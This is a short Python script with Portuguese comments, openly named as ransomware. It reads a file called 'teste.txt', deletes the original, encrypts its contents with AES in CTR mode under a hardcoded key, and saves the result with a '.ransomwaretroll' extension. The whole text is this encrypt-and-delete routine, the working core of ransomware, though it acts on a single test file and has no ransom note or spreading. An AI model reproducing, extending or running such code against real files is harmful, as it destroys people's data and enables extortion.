import os
import pyaes

## abre arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remove arquivo
os.remove(file_name)

## chave criptografica
key = b"trollaransomware"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografa arquivo
crypto_data = aes.encrypt(file_data)

## salva arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
